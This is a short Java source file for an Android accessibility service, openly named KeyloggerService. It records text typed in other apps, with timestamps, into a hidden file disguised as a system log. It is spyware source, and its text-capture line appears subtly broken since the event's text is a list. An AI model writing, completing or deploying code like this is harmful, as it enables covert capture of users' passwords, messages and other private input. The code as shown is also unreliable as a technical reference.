package com.security.ravan;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerService extends AccessibilityService {
    
    private File logFile;
    
    @Override
    public void onCreate() {
        super.onCreate();
        logFile = new File(getFilesDir(), ".system_log.txt");
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText();
            if (text != null && text.length() > 0) {
                String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(new Date());
                try (FileWriter fw = new FileWriter(logFile, true)) {
                    fw.write(timestamp + " | " + text.toString() + "\n");
                } catch (Exception e) {}
            }
        }
    }
    
    @Override
    public void onInterrupt() {}
}
